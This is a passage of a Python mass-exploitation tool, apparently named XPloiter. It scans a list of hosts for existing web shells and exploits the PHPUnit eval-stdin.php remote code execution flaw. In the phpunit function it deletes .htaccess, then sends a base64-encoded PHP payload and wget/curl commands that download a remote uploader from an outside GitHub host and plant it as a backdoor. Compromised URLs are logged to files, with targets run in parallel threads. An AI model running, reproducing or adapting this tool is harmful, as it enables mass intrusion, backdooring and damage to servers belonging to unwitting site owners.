                        print(fw+"["+fg+"scaning"+fw+"] "+fw+i+" "+fw+">>"+fg+" Found Pass Shell")
                        open("xploiter/shell.txt","a").write(url+"#"+pw+"\n")
                        open("xploiter/shellcracked.txt","a").write(url+"#"+pw+"\n")
                        break
                    else :
                        print(fw+"["+fr+"scaning"+fw+"] "+fw+i+" "+fw+">>"+fr+" Not Found Pass Shell")
                break
            elif ">File manager<" in req or "Cpanel Reset Password" in req or "WebRooT" in req or "PHP File Manager" in req or '<font color="red"><center> Shell :'in req or '<font color="green"><center> Up :' in req or "Haxgeno7" in req or "H3NING_MAL4M" in req or "?x=cmd&d=" in req or "aDriv4" in req or "<input type='submit' value='Submit'" in req or "Upload file :" in req or "uk45" in req or "-rwxrwxrwx" in req or "drwxr-x---" in req or "-rwxr-xr-x" in req or "#0x2525" in req or "#0x2515" in req or "-rw-rw-r--" in req or "Mini Shell" in req or "=== bbPress ===" in req or "Priv8 Home Root Uploader by Mrcakil" in req or "root@indoxploit" in req or "&mode=upload'>Upload file</a></td>" in req or "<input type=file name=f><input name=k type=submit id=k value=upload>" in req or 'name="_upl" type="submit" id="_upl" value="Upload"' in req or "trenggalek6etar" in req or "D3xterR00t" in req or "-r--r--r--" in req or "PHP Uploader - By Phenix-TN & Mr.Anderson" in req or '<option value="/tmp/">' in req or 'name="_upl"' in req and 'id="_upl"' in req and 'value="Upload"' in req or 'Sh3ll' in req or "Sh3ll By Anons79" in req or "CCAEF Uploader" in req or ">Upload file:" in req or "RevoLutioN Namesis" in req or "okokok" in req or 'value="Upload"></form>' in req or '<title>[ RC-SHELL' in req or '<option value="create_symlink">' in req or "Vuln!! patch it Now!" in req or "WSO 4.2.5<" in req or "Ghost Exploiter Team Official" in req or ">PHP File Manager<" in req or "1975 Team" in req or '&upload=gaskan">Upload File<' in req or 'name="_upl"' in req and 'id="_upl"' in req or "-rw-r--r--" in req or "drwxr-xr-x" in req or "-rw-rw-rw-" in req or "drwxrwxrwx" in req or "Owner/Group" in req or ">[ Home Shell ]<" in req or "Upload File : " in req or 'name="uploader" id="uploader"' in req or "l7WADead" in req or '<input type="submit" name="submit" value="Upload">' in req or "(Writeable)" in req or "blackpanther1337" in req :
                dapet = dapet + 1
                print(fw+"["+fg+"scaning"+fw+"] "+fw+i+" "+fw+">>"+fg+" Found Shell")
                
                open("xploiter/shell.txt","a").write(url+"\n")
            else :
                print(fw+"["+fy+"scaning"+fw+"] "+fw+i+" "+fw+">>"+fr+" Not Found Shell")
    except :
        pass

def phpunit(i) :
    global dapet
    head = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
    try :
        x = requests.session()
        nomi = ['/vendor/phpunit/phpunit/src/Util/PHP/','/laravel/vendor/phpunit/phpunit/src/Util/PHP/','/api/vendor/phpunit/phpunit/src/Util/PHP/','/sites/all/libraries/mailchimp/vendor/phpunit/phpunit/src/Util/PHP/','/modules/autoupgrade/vendor/phpunit/phpunit/src/Util/PHP/']
        for eclipsec in nomi :
            url = ("http://"+i+eclipsec+"eval-stdin.php")
            data = "<?php phpinfo(); ?>"
            cmd = x.get(url, data=data, timeout=15, verify=False)
            if "PHP License as published by the PHP Group" in cmd.text :
                print(fw+"["+fg+"scaning"+fw+"] "+fw+i+" "+fw+">>"+fg+" Found Phpunit")
                open("xploiter/phpunit.txt","a").write(url+"\n")
                data2 = "<?php system('rm .htaccess') ?>"
                x.get(url, data=data2, timeout=15, verify=False)
                data3 = "<?php eval('?>'.base64_decode('PD9waHANCmZ1bmN0aW9uIGFkbWluZXIoJHVybCwgJGlzaSkgew0KICAgICRmcCA9IGZvcGVuKCRpc2ksICJ3Iik7DQogICAgaWYgKCEkZnApIHsNCiAgICAgICAgcmV0dXJuIGZhbHNlOw0KICAgIH0NCiAgICAkY2ggPSBjdXJsX2luaXQoKTsNCiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfVVJMLCAkdXJsKTsNCiAgICBjdXJsX3NldG9wdCgkY2gsIENVUkxPUFRfUkVUVVJOVFJBTlNGRVIsIHRydWUpOw0KICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GSUxFLCAkZnApOw0KICAgIGN1cmxfc2V0b3B0KCRjaCwgQ1VSTE9QVF9GT0xMT1dMT0NBVElPTiwgdHJ1ZSk7DQogICAgY3VybF9zZXRvcHQoJGNoLCBDVVJMT1BUX1RJTUVPVVQsIDMwKTsNCiAgICAkc3VjY2VzcyA9IGN1cmxfZXhlYygkY2gpOw0KICAgIGN1cmxfY2xvc2UoJGNoKTsNCiAgICBmY2xvc2UoJGZwKTsNCiAgICByZXR1cm4gJHN1Y2Nlc3MgIT09IGZhbHNlOw0KfQ0KaWYgKGFkbWluZXIoImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9lY2xpYmVzZWMvdXBsb2FkZXIvcmVmcy9oZWFkcy9tYWluL2luZGV4LnBocCIsICJpbmRleC5waHAiKSkgew0KICAgIGVjaG8gIk5vd01lZWUiOw0KfSBlbHNlIHsNCiAgICBlY2hvICJmYWlsIjsNCn0NCj8+DQo=')); ?>"
                x.get(url, data=data3, timeout=15, verify=False)
                data4 = "<?php system('wget https://raw.githubusercontent.com/eclibesec/uploader/refs/heads/main/index.php -qO index.php');"
                x.get(url, data=data4, timeout=15, verify=False)
                data5 = "<?php system('curl -s https://raw.githubusercontent.com/eclibesec/uploader/refs/heads/main/index.php -o index.php');"
                x.get(url, data=data5, timeout=15, verify=False)
                url2 = ("http://"+i+eclipsec+"index.php?nm=nomi")
                spawn = x.get(url2, headers=head)
                if "NowMeee" in spawn.text:
                    dapet = dapet + 1
                    print(fw+"["+fg+"scaning"+fw+"] "+fw+i+" "+fw+">>"+fg+" Found Phpunit Shell")
                    open("xploiter/shell.txt","a").write(url2+"\n")
                    break
                else :
                    print(fw+"["+fy+"scaning"+fw+"] "+fw+i+" "+fw+">>"+fr+" Not Vuln Phpunit")
            else :
                print(fw+"["+fy+"scaning"+fw+"] "+fw+i+" "+fw+">>"+fr+" Not Found Phpunit")
    except :
        pass
def dispatcher(target, dir):
    kcfinder(target, dir)
    jquery_file_uplaod(target)
    jquery_filer(target)
    phpunit(target)
    alfa(target)
    xploiter(target)
    wpins(target)
    roxy(target)
if __name__ == "__main__":
    clear = '\x1b[0m'
    colors = [36, 32, 34, 35, 31, 37]
    x = """
██╗░░██╗██████╗░██╗░░░░░░█████╗░██╗████████╗███████╗██████╗░░░░░░░██████╗░░░░░█████╗░
╚██╗██╔╝██╔══██╗██║░░░░░██╔══██╗██║╚══██╔══╝██╔════╝██╔══██╗░░░░░░╚════██╗░░░██╔══██╗
░╚███╔╝░██████╔╝██║░░░░░██║░░██║██║░░░██║░░░█████╗░░██████╔╝█████╗░█████╔╝░░░╚█████╔╝
░██╔██╗░██╔═══╝░██║░░░░░██║░░██║██║░░░██║░░░██╔══╝░░██╔══██╗╚════╝░╚═══██╗░░░██╔══██╗
██╔╝╚██╗██║░░░░░███████╗╚█████╔╝██║░░░██║░░░███████╗██║░░██║░░░░░░██████╔╝██╗╚█████╔╝
╚═╝░░╚═╝╚═╝░░░░░╚══════╝░╚════╝░╚═╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝░░░░░░╚═════╝░╚═╝░╚════╝░\n- eclipse security labs
- visit - https://eclipsesec.tech/\n"""
    for N, line in enumerate(x.split("\n")):
        sys.stdout.write(" \x1b[1;%dm%s%s\n " % (random.choice(colors), line, clear))
        time.sleep(0.05)
    file_path = input("$ Enter your file list: ").strip()
    try:
        with open(file_path, mode='r', encoding='utf-8', errors='ignore') as f:
            target = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print("[!] File not found.")
        sys.exit(1)

    try:
        thread_count = int(input("$ Thread count: ").strip())
    except ValueError:
        print("[!] Invalid thread count. Must be an integer.")
        sys.exit(1)
    p = Pool(thread_count)
    dispatcher_partial = partial(dispatcher, dir=dir)
    p.map(dispatcher_partial, target)
    p.close()
    p.join()

